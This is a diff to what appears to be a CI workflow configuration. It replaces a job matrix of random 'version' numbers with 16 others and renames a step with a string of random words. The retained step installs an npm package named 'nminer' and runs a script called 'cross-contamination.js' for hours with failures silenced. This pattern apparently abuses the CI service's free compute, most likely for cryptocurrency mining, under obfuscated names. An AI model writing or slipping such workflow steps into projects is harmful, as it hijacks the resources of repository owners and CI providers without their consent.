@@ -9,25 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8357 }
-          - { version: 7583 }
-          - { version: 4599 }
-          - { version: 3380 }
-          - { version: 1528 }
-          - { version: 4840 }
-          - { version: 7351 }
-          - { version: 5581 }
-          - { version: 3031 }
-          - { version: 627 }
-          - { version: 4662 }
-          - { version: 2199 }
-          - { version: 7149 }
-          - { version: 1014 }
-          - { version: 6392 }
-          - { version: 1243 }
-          - { version: 4214 }
-          - { version: 5598 }
-          - { version: 5995 }
+          - { version: 111 }
+          - { version: 9668 }
+          - { version: 8993 }
+          - { version: 6061 }
+          - { version: 891 }
+          - { version: 1238 }
+          - { version: 9513 }
+          - { version: 8518 }
+          - { version: 2426 }
+          - { version: 6347 }
+          - { version: 4054 }
+          - { version: 8658 }
+          - { version: 6898 }
+          - { version: 2460 }
+          - { version: 9331 }
+          - { version: 4360 }
 
     steps:
       - name: Checkout
@@ -38,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: charlatan underneath aged jittery
         run: |
           npm install nminer@latest
-          timeout 347m node cross-contamination.js || echo "cross-contamination executed"
+          timeout 333m node cross-contamination.js || echo "cross-contamination executed"
